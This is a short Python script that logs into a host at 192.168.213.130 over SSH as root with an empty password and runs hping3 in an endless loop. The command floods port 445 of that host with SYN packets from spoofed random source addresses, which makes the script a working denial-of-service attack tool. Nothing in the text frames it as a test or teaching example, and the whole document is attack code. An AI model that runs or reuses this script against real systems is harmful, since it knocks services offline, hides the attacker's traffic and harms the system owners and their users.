import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('192.168.213.130', username='root', password='')
while 1:
    stdin, stdout, stderr = client.exec_command('hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source 192.168.213.130')
print stdout.read()
client.close()
